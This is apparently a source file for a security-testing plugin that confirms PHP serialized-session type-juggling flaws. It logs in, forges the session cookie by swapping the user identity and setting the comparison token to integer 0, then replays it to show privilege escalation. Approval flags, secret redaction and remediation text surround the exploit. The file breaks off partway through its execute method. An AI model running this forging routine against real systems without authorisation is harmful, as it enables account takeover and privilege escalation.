"""Bounded PHP serialized type-juggling confirmation.

The only supported mode obtains an unsigned serialized session through an
approved login, patches two existing scalar properties offline, and proves an
original/forged/original privilege differential before an explicitly approved
lab/CTF effect. Raw credentials, cookies, tokens, and carriers never leave the
agent process.
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
from html import unescape
from http.cookies import SimpleCookie
from typing import Any, Dict, Iterable, List, NamedTuple, Optional, Tuple
from urllib.parse import quote, unquote, urlencode, urljoin, urlsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    REDACTED_RUNTIME_SECRET,
    _field_name,
    _http_target,
    _path_and_query,
    _relative_path,
    extract_form_token,
    sanitize_evidence_text,
)


ALLOWED_MODES = {"php-serialized-type-juggling"}
ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
ALLOWED_PROOF_LEVELS = {"runtime-privilege-differential", "lab-state-change"}
STATE_CHANGE_ENGAGEMENTS = {"lab", "ctf"}
_STATE_CHANGE_PARAMETERS = {
    "effectPath",
    "solvedPath",
    "unsolvedMarker",
    "solvedMarker",
    "expectedEffectStatus",
    "expectedEffectLocation",
    "expectedSolvedStatus",
    "stateChangeApproved",
}
_BOUND_PARAMETER_NAMES = {
    "mode",
    "proofLevel",
    "loginPath",
    "privilegePath",
    "effectPath",
    "solvedPath",
    "expectedLoginLocation",
    "expectedEffectLocation",
    "cookieName",
    "usernameField",
    "passwordField",
    "csrfField",
    "username",
    "password",
    "serializedClass",
    "identityProperty",
    "tokenProperty",
    "sourceIdentity",
    "targetIdentity",
    "unsolvedMarker",
    "deniedMarker",
    "privilegeMarker",
    "solvedMarker",
    "expectedLoginStatus",
    "expectedLoginSubmitStatus",
    "expectedDeniedStatus",
    "expectedPrivilegeStatus",
    "expectedEffectStatus",
    "expectedSolvedStatus",
    "engagement",
    "allowUnsafeMethods",
    "stateChangeApproved",
    "timeoutSeconds",
}
RUNTIME_EXPECTED_STEP_LABELS = (
    "login-form-baseline",
    "login-submit",
    "original-session-denied",
    "type-confused-privileged",
    "original-session-replay-denied",
)
LAB_EXPECTED_STEP_LABELS = (
    "login-form-unsolved",
    "login-submit",
    "original-session-denied",
    "type-confused-privileged",
    "original-session-replay-denied",
    "authorized-effect",
    "solved-confirmation",
)
EXPECTED_STEP_LABELS_BY_PROOF_LEVEL = {
    "runtime-privilege-differential": RUNTIME_EXPECTED_STEP_LABELS,
    "lab-state-change": LAB_EXPECTED_STEP_LABELS,
}
# Backwards-compatible alias for calibration callers and fixtures.
EXPECTED_STEP_LABELS = LAB_EXPECTED_STEP_LABELS
MAX_CARRIER_BYTES = 32_768
MAX_RESPONSE_BYTES = 60_000
MAX_EVIDENCE_CHARS = 65_000
MAX_CREDENTIAL_CHARS = 512
MAX_MARKER_CHARS = 512
MAX_PROPERTIES = 128
MAX_PROPERTY_NAME_BYTES = 200
MAX_SCALAR_BYTES = 8_192

_COOKIE_NAME = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]{1,128}$")
_CLASS_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_\\]{0,199}$")
_PROPERTY_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,199}$")
_IDENTITY = re.compile(r"^[A-Za-z0-9_.@-]{1,128}$")


class PhpSerializedError(ValueError):
    """Raised for unsupported or malformed serialized PHP input."""


class PhpProperty(NamedTuple):
    name: str
    value_type: str
    value: Any
    value_start: int
    value_end: int
    serialized_value: bytes


class PhpObject(NamedTuple):
    class_name: str
    properties: Tuple[PhpProperty, ...]
    raw: bytes

    @property
    def property_order(self) -> List[str]:
        return [item.name for item in self.properties]

    def by_name(self) -> Dict[str, PhpProperty]:
        return {item.name: item for item in self.properties}


def _sha256_bytes(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def _sha256_text(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _parse_ascii_integer(
    data: bytes,
    offset: int,
    delimiter: bytes,
    *,
    allow_negative: bool = False,
) -> Tuple[int, int]:
    end = data.find(delimiter, offset)
    if end < 0:
        raise PhpSerializedError("serialized integer delimiter is missing")
    raw = data[offset:end]
    pattern = rb"-?(?:0|[1-9][0-9]*)" if allow_negative else rb"(?:0|[1-9][0-9]*)"
    if not raw or re.fullmatch(pattern, raw) is None:
        raise PhpSerializedError("serialized integer is malformed")
    try:
        return int(raw.decode("ascii")), end + len(delimiter)
    except (UnicodeDecodeError, ValueError) as exc:
        raise PhpSerializedError("serialized integer is invalid") from exc


def _parse_php_string(data: bytes, offset: int) -> Tuple[bytes, int]:
    if not data.startswith(b"s:", offset):
        raise PhpSerializedError("expected a serialized PHP string")
    length, cursor = _parse_ascii_integer(data, offset + 2, b":")
    if length > MAX_SCALAR_BYTES or not data.startswith(b'"', cursor):
        raise PhpSerializedError("serialized PHP string length is unsupported")
    value_start = cursor + 1
    value_end = value_start + length
    if value_end > len(data) or data[value_end : value_end + 2] != b'";':
        raise PhpSerializedError("serialized PHP string byte length does not match")
    return data[value_start:value_end], value_end + 2


def _parse_scalar(data: bytes, offset: int) -> Tuple[str, Any, int]:
    if data.startswith(b"s:", offset):
        raw, end = _parse_php_string(data, offset)
        try:
            value = raw.decode("utf-8")
        except UnicodeDecodeError as exc:
            raise PhpSerializedError("serialized strings must be valid UTF-8") from exc
        if "\0" in value:
            raise PhpSerializedError("serialized scalar contains a null byte")
        return "string", value, end
    if data.startswith(b"i:", offset):
        value, end = _parse_ascii_integer(data, offset + 2, b";", allow_negative=True)
        return "int", value, end
    if data.startswith(b"b:", offset):
        if data[offset + 2 : offset + 4] == b"0;":
            return "bool", False, offset + 4
        if data[offset + 2 : offset + 4] == b"1;":
            return "bool", True, offset + 4
        raise PhpSerializedError("serialized boolean is malformed")
    if data.startswith(b"N;", offset):
        return "null", None, offset + 2
    raise PhpSerializedError(
        "only top-level scalar properties are supported; arrays, objects, custom objects, "
        "and references are rejected"
    )


def parse_php_object(raw: bytes, expected_class: Optional[str] = None) -> PhpObject:
    if not isinstance(raw, bytes) or not raw or len(raw) > MAX_CARRIER_BYTES:
        raise PhpSerializedError("serialized carrier is empty or exceeds the bounded size")
    if not raw.startswith(b"O:"):
        raise PhpSerializedError("carrier is not a PHP serialized object")

    class_length, cursor = _parse_ascii_integer(raw, 2, b":")
    if class_length < 1 or class_length > 200 or not raw.startswith(b'"', cursor):
        raise PhpSerializedError("serialized class name is malformed")
    class_start = cursor + 1
    class_end = class_start + class_length
    if class_end > len(raw) or raw[class_end : class_end + 2] != b'":':
        raise PhpSerializedError("serialized class byte length does not match")
    try:
        class_name = raw[class_start:class_end].decode("utf-8")
    except UnicodeDecodeError as exc:
        raise PhpSerializedError("serialized class name must be valid UTF-8") from exc
    if _CLASS_NAME.fullmatch(class_name) is None:
        raise PhpSerializedError("serialized class name is unsupported")
    if expected_class is not None and class_name != expected_class:
        raise PhpSerializedError("serialized class does not match the configured class")

    property_count, cursor = _parse_ascii_integer(raw, class_end + 2, b":")
    if property_count < 2 or property_count > MAX_PROPERTIES or not raw.startswith(b"{", cursor):
        raise PhpSerializedError("serialized property count is unsupported")
    cursor += 1
    properties: List[PhpProperty] = []
    seen = set()
    for _ in range(property_count):
        key_raw, cursor = _parse_php_string(raw, cursor)
        if len(key_raw) > MAX_PROPERTY_NAME_BYTES:
            raise PhpSerializedError("serialized property name is too long")
        try:
            name = key_raw.decode("utf-8")
        except UnicodeDecodeError as exc:
            raise PhpSerializedError("serialized property names must be valid UTF-8") from exc
        if _PROPERTY_NAME.fullmatch(name) is None or name in seen:
            raise PhpSerializedError("serialized property name is unsafe or duplicated")
        seen.add(name)
        value_start = cursor
        value_type, value, cursor = _parse_scalar(raw, cursor)
        properties.append(
            PhpProperty(
                name=name,
                value_type=value_type,
                value=value,
                value_start=value_start,
                value_end=cursor,
                serialized_value=raw[value_start:cursor],
            )
        )
    if cursor >= len(raw) or raw[cursor : cursor + 1] != b"}" or cursor + 1 != len(raw):
        raise PhpSerializedError("serialized object has trailing or missing bytes")
    return PhpObject(class_name=class_name, properties=tuple(properties), raw=raw)


def _serialize_php_string(value: str) -> bytes:
    encoded = value.encode("utf-8")
    return b"s:" + str(len(encoded)).encode("ascii") + b':"' + encoded + b'";'


def forge_type_juggling_object(
    original: PhpObject,
    identity_property: str,
    token_property: str,
    source_identity: str,
    target_identity: str,
) -> Tuple[PhpObject, List[Dict[str, Any]]]:
    if identity_property == token_property:
        raise PhpSerializedError("identity and token properties must be distinct")
    by_name = original.by_name()
    identity = by_name.get(identity_property)
    token = by_name.get(token_property)
    if not identity or not token:
        raise PhpSerializedError("configured identity or token property is absent")
    if identity.value_type != "string" or identity.value != source_identity:
        raise PhpSerializedError("configured source identity does not match the serialized object")
    if token.value_type != "string" or not token.value:
        raise PhpSerializedError("comparison token must be a non-empty serialized string")

    replacements = [
        (identity.value_start, identity.value_end, _serialize_php_string(target_identity)),
        (token.value_start, token.value_end, b"i:0;"),
    ]
    forged_raw = original.raw
    for start, end, replacement in sorted(replacements, key=lambda item: item[0], reverse=True):
        forged_raw = forged_raw[:start] + replacement + forged_raw[end:]
    forged = parse_php_object(forged_raw, original.class_name)
    forged_by_name = forged.by_name()
    if (
        forged.property_order != original.property_order
        or len(forged.properties) != len(original.properties)
        or forged_by_name[identity_property].value_type != "string"
        or forged_by_name[identity_property].value != target_identity
        or forged_by_name[token_property].value_type != "int"
        or forged_by_name[token_property].value != 0
    ):
        raise PhpSerializedError("forged carrier failed structural verification")
    for item in original.properties:
        if item.name in {identity_property, token_property}:
            continue
        if forged_by_name[item.name].serialized_value != item.serialized_value:
            raise PhpSerializedError("forged carrier changed an unrelated property")

    mutations = [
        {
            "role": "identity",
            "path": identity_property,
            "beforeType": "string",
            "beforeValueSha256": _sha256_text(source_identity),
            "beforeValueLength": len(source_identity.encode("utf-8")),
            "afterType": "string",
            "afterValue": target_identity,
            "afterValueLength": len(target_identity.encode("utf-8")),
        },
        {
            "role": "comparison-token",
            "path": token_property,
            "beforeType": "string",
            "beforeValueSha256": _sha256_text(str(token.value)),
            "beforeValueLength": len(str(token.value).encode("utf-8")),
            "afterType": "int",
            "afterValue": 0,
        },
    ]
    return forged, mutations


def decode_cookie_carrier(cookie_value: str) -> Tuple[bytes, str]:
    if not cookie_value or len(cookie_value) > 65_536 or any(ch in cookie_value for ch in "\r\n\0"):
        raise PhpSerializedError("session cookie is empty or oversized")
    decoded_percent = unquote(cookie_value)
    encoding = "url-percent-base64" if decoded_percent != cookie_value else "base64"
    try:
        carrier = base64.b64decode(decoded_percent, validate=True)
    except Exception as exc:
        raise PhpSerializedError("session cookie is not strict base64") from exc
    if not carrier or len(carrier) > MAX_CARRIER_BYTES:
        raise PhpSerializedError("decoded serialized carrier is empty or oversized")
    return carrier, encoding


def encode_cookie_carrier(carrier: bytes, encoding: str) -> str:
    encoded = base64.b64encode(carrier).decode("ascii")
    if encoding == "url-percent-base64":
        return quote(encoded, safe="")
    if encoding == "base64":
        return encoded
    raise PhpSerializedError("unsupported carrier encoding")


def _safe_marker(value: Any) -> Optional[str]:
    marker = str(value or "")
    if (
        len(marker) < 3
        or len(marker) > MAX_MARKER_CHARS
        or any(ch in marker for ch in "\r\n\0")
    ):
        return None
    return marker


def _bounded_status(parameters: Dict[str, Any], name: str, minimum: int, maximum: int) -> Optional[int]:
    try:
        value = int(parameters[name])
    except (KeyError, TypeError, ValueError):
        return None
    return value if minimum <= value <= maximum else None


def _optional_status(
    parameters: Dict[str, Any], name: str, minimum: int = 100, maximum: int = 599
) -> Optional[int]:
    if parameters.get(name) is None:
        return None
    return _bounded_status(parameters, name, minimum, maximum)


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    target = _http_target(parameters.get("target") or parameters.get("url"))
    if not target:
        return False, "target must be a credential-free HTTP(S) base URL"
    if str(parameters.get("mode") or "").lower() not in ALLOWED_MODES:
        return False, "mode must be php-serialized-type-juggling"
    if str(parameters.get("engagement") or "").lower() not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"

    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-privilege-differential or lab-state-change"
    is_lab = proof_level == "lab-state-change"
    if not is_lab:
        unexpected = sorted(_STATE_CHANGE_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, f"{unexpected[0]} is only allowed for proofLevel=lab-state-change"
    elif str(parameters.get("engagement") or "").lower() not in STATE_CHANGE_ENGAGEMENTS:
        return False, "lab-state-change requires engagement lab or ctf"
    elif parameters.get("stateChangeApproved") is not True:
        return False, "stateChangeApproved=true is required for lab-state-change"

    required_paths = ["loginPath", "privilegePath"]
    if is_lab:
        required_paths.extend(["effectPath", "solvedPath"])
    for name in required_paths:
        if not _relative_path(parameters.get(name)):
            return False, f"{name} must be a bounded same-origin relative path"
    for name in ("expectedLoginLocation", "expectedEffectLocation"):
        if parameters.get(name) is not None and not _relative_path(parameters.get(name)):
            return False, f"{name} must be a bounded same-origin relative path"
    for name in ("usernameField", "passwordField"):
        if not _field_name(parameters.get(name)):
            return False, f"{name} must be a valid form-field name"
    if parameters.get("csrfField") not in (None, "") and not _field_name(
        parameters.get("csrfField")
    ):
        return False, "csrfField must be a valid form-field name"

    username = str(parameters.get("username") or "")
    password = str(parameters.get("password") or "")
    if not username or len(username) > MAX_CREDENTIAL_CHARS:
        return False, "username is required and must be bounded"
    if not password or len(password) > MAX_CREDENTIAL_CHARS:
        return False, "password is required and must be bounded"
    if parameters.get("cookieName") is not None and _COOKIE_NAME.fullmatch(
        str(parameters.get("cookieName") or "")
    ) is None:
        return False, "cookieName is invalid"
    if parameters.get("serializedClass") is not None and _CLASS_NAME.fullmatch(
        str(parameters.get("serializedClass") or "")
    ) is None:
        return False, "serializedClass is invalid"
    identity_property = str(parameters.get("identityProperty") or "")
    token_property = str(parameters.get("tokenProperty") or "")
    if identity_property and _PROPERTY_NAME.fullmatch(identity_property) is None:
        return False, "identityProperty must be a safe property name"
    if token_property and _PROPERTY_NAME.fullmatch(token_property) is None:
        return False, "tokenProperty must be a safe property name"
    if identity_property and identity_property == token_property:
        return False, "identityProperty and tokenProperty must be distinct safe names"
    source_identity = str(parameters.get("sourceIdentity") or username)
    target_identity = str(parameters.get("targetIdentity") or "")
    if (
        _IDENTITY.fullmatch(source_identity) is None
        or _IDENTITY.fullmatch(target_identity) is None
        or source_identity == target_identity
    ):
        return False, "sourceIdentity and targetIdentity must be distinct bounded identities"
    if source_identity != username:
        return False, "sourceIdentity must match the authenticated username"

    marker_names = (
        ("unsolvedMarker", "deniedMarker", "privilegeMarker", "solvedMarker")
        if is_lab
        else tuple(
            name
            for name in ("deniedMarker", "privilegeMarker")
            if parameters.get(name) is not None
        )
    )
    markers = [_safe_marker(parameters.get(name)) for name in marker_names]
    if any(marker is None for marker in markers) or len(set(markers)) != len(markers):
        return False, "proof markers must be distinct bounded strings"
    if not is_lab and len(marker_names) == 1:
        return False, "deniedMarker and privilegeMarker must be supplied together"
    if is_lab:
        unsolved = str(parameters.get("unsolvedMarker") or "")
        solved = str(parameters.get("solvedMarker") or "")
        if unsolved in solved or solved in unsolved:
            return False, "unsolvedMarker and solvedMarker must not contain each other"

    status_bounds = {
        "expectedLoginStatus": (100, 599),
        "expectedLoginSubmitStatus": (100, 599),
        "expectedDeniedStatus": (100, 599),
        "expectedPrivilegeStatus": (100, 599),
        "expectedEffectStatus": (100, 599),
        "expectedSolvedStatus": (100, 599),
    }
    if any(
        parameters.get(name) is not None and _optional_status(parameters, name, *bounds) is None
        for name, bounds in status_bounds.items()
    ):
        return False, "expected statuses are outside the bounded contract"
    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"
    return True, ""


def _extract_cookie(headers: Any, cookie_name: str) -> Optional[str]:
    for header in headers.getall("Set-Cookie", []):
        parsed = SimpleCookie()
        try:
            parsed.load(header)
        except Exception:
            continue
        morsel = parsed.get(cookie_name)
        if morsel is not None and morsel.value:
            return morsel.value
    return None


def _cookie_pairs(headers: Any) -> List[Tuple[str, str]]:
    pairs: List[Tuple[str, str]] = []
    for header in headers.getall("Set-Cookie", []):
        parsed = SimpleCookie()
        try:
            parsed.load(header)
        except Exception:
            continue
        for name, morsel in parsed.items():
            if _COOKIE_NAME.fullmatch(name) and morsel.value:
                pairs.append((name, morsel.value))
    return pairs


def _select_cookie(headers: Any, configured_name: str = "") -> Tuple[str, str]:
    pairs = _cookie_pairs(headers)
    if configured_name:
        matching = [(name, value) for name, value in pairs if name == configured_name]
        if len(matching) != 1:
            raise PhpSerializedError("configured cookie was not issued exactly once")
        return matching[0]
    unique = list(dict.fromkeys(pairs))
    if len(unique) != 1:
        raise PhpSerializedError("response did not issue one unambiguous session cookie")
    return unique[0]


def _select_serialized_cookie(
    headers: Any,
    configured_name: str = "",
) -> Tuple[str, str, PhpObject, str]:
    candidates: List[Tuple[str, str, PhpObject, str]] = []
    for name, value in _cookie_pairs(headers):
        if configured_name and name != configured_name:
            continue
        try:
            raw, encoding = decode_cookie_carrier(value)
            parsed = parse_php_object(raw)
        except PhpSerializedError:
            continue
        candidates.append((name, value, parsed, encoding))
    if len(candidates) != 1:
        raise PhpSerializedError("login did not issue one unambiguous PHP serialized cookie")
    return candidates[0]


def _resolve_mutation_fields(
    original: PhpObject,
    parameters: Dict[str, Any],
) -> Tuple[str, str, str]:
    by_name = original.by_name()
    source_identity = str(parameters.get("sourceIdentity") or parameters["username"])
    identity_hint = str(parameters.get("identityProperty") or "")
    token_hint = str(parameters.get("tokenProperty") or "")

    if identity_hint:
        identity = by_name.get(identity_hint)
        identity_names = (
            [identity_hint]
            if identity and identity.value_type == "string" and identity.value == source_identity
            else []
        )
    else:
        identity_names = [
            item.name
            for item in original.properties
            if item.value_type == "string" and item.value == source_identity
        ]
    if len(identity_names) != 1:
        raise PhpSerializedError("serialized identity property is absent or ambiguous")
    identity_property = identity_names[0]

    if token_hint:
        token = by_name.get(token_hint)
        token_names = (
            [token_hint]
            if token
            and token.name != identity_property
            and token.value_type == "string"
            and bool(token.value)
            else []
        )
    else:
        token_names = [
            item.name
            for item in original.properties
            if item.name != identity_property and item.value_type == "string" and bool(item.value)
        ]
    if len(token_names) != 1:
        raise PhpSerializedError("serialized comparison-token property is absent or ambiguous")
    return identity_property, token_names[0], source_identity


def _response_contains(body: str, marker: str) -> bool:
    return marker in body or marker in unescape(body)


def _redacted_form_body(parameters: Dict[str, Any], csrf_field: str) -> str:
    form = {
        str(parameters["usernameField"]): REDACTED_RUNTIME_SECRET,
        str(parameters["passwordField"]): REDACTED_RUNTIME_SECRET,
    }
    if csrf_field:
        form[csrf_field] = REDACTED_RUNTIME_SECRET
    return urlencode(form)


def _request_transcript(
    method: str,
    url: str,
    evidence_body: str,
    include_cookie: bool,
) -> str:
    parsed = urlsplit(url)
    lines = [
        f"{method} {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        "User-Agent: xASM-Agentic-Deserialization-Probe/1.0",
        "Accept: text/html,application/xhtml+xml,text/plain",
    ]
    if include_cookie:
        lines.append(f"Cookie: {REDACTED_RUNTIME_SECRET}")
    if method == "POST":
        lines.extend(
            [
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(evidence_body.encode('utf-8'))}",
            ]
        )
    return "\r\n".join(lines) + "\r\n\r\n" + evidence_body


def _response_transcript(
    response: Dict[str, Any],
    secret_values: Iterable[Any],
) -> Tuple[str, bool]:
    lines = [f"HTTP/1.1 {int(response.get('status') or 0)} {str(response.get('reason') or '')[:100]}"]
    for name in ("Content-Type", "Location", "Set-Cookie"):
        for value in response.get("headers").getall(name, []):
            # Do not depend on the selected serialized carrier being the only
            # cookie emitted by the response. Every Set-Cookie value is session
            # material and must stay on the native-agent side of the boundary.
            lines.append(
                f"{name}: "
                f"{REDACTED_RUNTIME_SECRET if name == 'Set-Cookie' else value}"
            )
    raw = "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or "")
    oversized = len(raw) > MAX_EVIDENCE_CHARS
    return (
        sanitize_evidence_text(raw, secret_values, MAX_EVIDENCE_CHARS),
        bool(response.get("truncated")) or oversized,
    )


def build_http_evidence_step(
    label: str,
    method: str,
    url: str,
    evidence_body: str,
    include_cookie: bool,
    response: Dict[str, Any],
    secret_values: Iterable[Any],
    carrier_role: str,
    carrier_sha256: str,
) -> Dict[str, Any]:
    request = _request_transcript(method, url, evidence_body, include_cookie)
    response_text, truncated = _response_transcript(response, secret_values)
    response_body = response_text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in response_text else ""
    return {
        "label": label,
        "carrierRole": carrier_role,
        "carrierSha256": carrier_sha256,
        "request": request,
        "requestSha256": _sha256_text(request),
        "response": response_text,
        "responseSha256": _sha256_text(response_text),
        "responseBodySha256": _sha256_text(response_body),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(response_body.encode("utf-8")),
        "responseExcerptTruncated": truncated,
    }


def _structural_snapshot(value: PhpObject) -> str:
    return json.dumps(
        {
            "className": value.class_name,
            "properties": [
                {
                    "name": item.name,
                    "type": item.value_type,
                    "value": (
                        REDACTED_RUNTIME_SECRET
                        if item.value_type == "string"
                        else item.value
                    ),
                }
                for item in value.properties
            ],
        },
        ensure_ascii=False,
        separators=(",", ":"),
    )


def _structure_sha256(value: PhpObject) -> str:
    canonical = json.dumps(
        {
            "format": "php-serialized-object",
            "className": value.class_name,
            "propertyOrder": value.property_order,
        },
        ensure_ascii=False,
        separators=(",", ":"),
    )
    return _sha256_text(canonical)


def _parameter_binding_value(value: Any) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    if value is None:
        return "null"
    return str(value)


def _parameter_bindings(parameters: Dict[str, Any]) -> Dict[str, Dict[str, Any]]:
    bindings: Dict[str, Dict[str, Any]] = {}
    for name in sorted(_BOUND_PARAMETER_NAMES):
        if name not in parameters:
            continue
        encoded = _parameter_binding_value(parameters[name]).encode("utf-8")
        bindings[name] = {
            "sha256": hashlib.sha256(encoded).hexdigest(),
            "length": len(encoded),
        }
    return bindings


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    return {
        "template-id": "xasm-php-serialized-type-juggling-candidate",
        "matcher-name": "php-serialized-type-juggling",
        "type": "http",
        "host": target,
        "matched-at": urljoin(target, str(verification.get("privilegePath") or "/")),
        "info": {
            "name": "Verified Insecure Deserialization via PHP Type Juggling",
            "severity": "high",
            "description": "A forged PHP serialized session passed a protected-route differential.",
            "remediation": (
                "Do not deserialize client-controlled objects; use opaque server-side sessions, "
                "authenticated carriers, and strict typed comparisons."
            ),
            "classification": {"cwe-id": ["CWE-502"]},
        },
        "evidence": verification,
    }


class DeserializationProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:deserialization_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms one bounded unsigned PHP serialized type-juggling primitive with an "
            "original/forged/original privilege differential; an optional lab tier adds an "
            "approved state change and solved confirmation."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        lab_required = sorted(
            {
                "effectPath",
                "solvedPath",
                "unsolvedMarker",
                "deniedMarker",
                "privilegeMarker",
                "solvedMarker",
                "stateChangeApproved",
            }
        )
        state_change_fields = sorted(_STATE_CHANGE_PARAMETERS)
        return {
            "type": "object",
            "additionalProperties": False,
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {"type": "string", "enum": sorted(ALLOWED_PROOF_LEVELS)},
                "loginPath": {"type": "string"},
                "privilegePath": {"type": "string"},
                "effectPath": {"type": "string"},
                "solvedPath": {"type": "string"},
                "expectedLoginLocation": {"type": "string"},
                "expectedEffectLocation": {"type": "string"},
                "cookieName": {"type": "string"},
                "usernameField": {"type": "string"},
                "passwordField": {"type": "string"},
                "csrfField": {"type": "string"},
                "username": {"type": "string", "x-hidden": True},
                "password": {"type": "string", "x-hidden": True},
                "serializedClass": {"type": "string"},
                "identityProperty": {"type": "string"},
                "tokenProperty": {"type": "string"},
                "sourceIdentity": {"type": "string"},
                "targetIdentity": {"type": "string"},
                "unsolvedMarker": {"type": "string"},
                "deniedMarker": {"type": "string"},
                "privilegeMarker": {"type": "string"},
                "solvedMarker": {"type": "string"},
                "expectedLoginStatus": {"type": "integer"},
                "expectedLoginSubmitStatus": {"type": "integer"},
                "expectedDeniedStatus": {"type": "integer"},
                "expectedPrivilegeStatus": {"type": "integer"},
                "expectedEffectStatus": {"type": "integer"},
                "expectedSolvedStatus": {"type": "integer"},
                "engagement": {"type": "string", "enum": ["standard", "aggressive", "lab", "ctf"]},
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 30},
            },
            "required": [
                "mode",
                "proofLevel",
                "loginPath",
                "privilegePath",
                "usernameField",
                "passwordField",
                "username",
                "password",
                "targetIdentity",
                "engagement",
                "allowUnsafeMethods",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "allOf": [
                {
                    "if": {"properties": {"proofLevel": {"const": "lab-state-change"}}},
                    "then": {"required": lab_required},
                    "else": {
                        "not": {
                            "anyOf": [{"required": [field]} for field in state_change_fields]
                        }
                    },
                }
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "credentials", "serialized-cookie"],
            "output_type": ["findings", "deserialization_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm PHP serialized type-juggling authorization bypass",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        body: Optional[str] = None,
        cookie_name: str = "",
        cookie_value: str = "",
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": "xASM-Agentic-Deserialization-Probe/1.0",
            "Accept": "text/html,application/xhtml+xml,text/plain",
        }
        if body is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        if cookie_name and cookie_value:
            headers["Cookie"] = f"{cookie_name}={cookie_value}"
        async with session.request(
            method,
            url,
            headers=headers,
            data=body,
            allow_redirects=False,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
            }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        assert target is not None
        proof_level = str(parameters["proofLevel"]).lower()
        is_lab = proof_level == "lab-state-change"
        step_labels = EXPECTED_STEP_LABELS_BY_PROOF_LEVEL[proof_level]
        login_url = urljoin(target, str(parameters["loginPath"]))
        privilege_url = urljoin(target, str(parameters["privilegePath"]))
        effect_url = urljoin(target, str(parameters["effectPath"])) if is_lab else ""
        solved_url = urljoin(target, str(parameters["solvedPath"])) if is_lab else ""
        cookie_name_hint = str(parameters.get("cookieName") or "")
        csrf_field = str(parameters.get("csrfField") or "")
        timeout = int(parameters.get("timeoutSeconds") or 15)

        def expected_status(name: str) -> Optional[int]:
            return int(parameters[name]) if parameters.get(name) is not None else None

        expected_login = expected_status("expectedLoginStatus")
        expected_login_submit = expected_status("expectedLoginSubmitStatus")
        expected_denied = expected_status("expectedDeniedStatus")
        expected_privilege = expected_status("expectedPrivilegeStatus")
        expected_effect = expected_status("expectedEffectStatus") if is_lab else None
        expected_solved = expected_status("expectedSolvedStatus") if is_lab else None
        unsolved_marker = str(parameters.get("unsolvedMarker") or "") if is_lab else ""
        denied_marker = str(parameters.get("deniedMarker") or "")
        privilege_marker = str(parameters.get("privilegeMarker") or "")
        solved_marker = str(parameters.get("solvedMarker") or "") if is_lab else ""

        request_count = 0
        evidence_steps: List[Dict[str, Any]] = []
        secrets: List[Any] = [parameters["username"], parameters["password"]]
        assertion_mismatches: List[Dict[str, Any]] = []

        def corroborate_status(label: str, expected: Optional[int], observed: int) -> None:
            if expected is not None and int(expected) != int(observed):
                assertion_mismatches.append(
                    {"assertion": label, "expected": int(expected), "observed": int(observed)}
                )

        def corroborate_location(label: str, expected: Any, observed: Any) -> None:
            if expected is None:
                return
            expected_text = str(expected)
            observed_text = str(observed or "")
            if expected_text != observed_text:
                assertion_mismatches.append(
                    {
                        "assertion": label,
                        "expected": sanitize_evidence_text(expected_text, secrets, 2_048),
                        "observed": sanitize_evidence_text(observed_text, secrets, 2_048),
                    }
                )

        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
        try:
            async with aiohttp.ClientSession(
                timeout=timeout_config,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                login_page = await self._request(session, "GET", login_url)
                request_count += 1
                corroborate_status(
                    "expectedLoginStatus/login-form", expected_login, login_page["status"]
                )
                if login_page["truncated"] or not 200 <= int(login_page["status"]) <= 399:
                    raise ValueError("login form response was not bounded and reachable")
                if is_lab and (
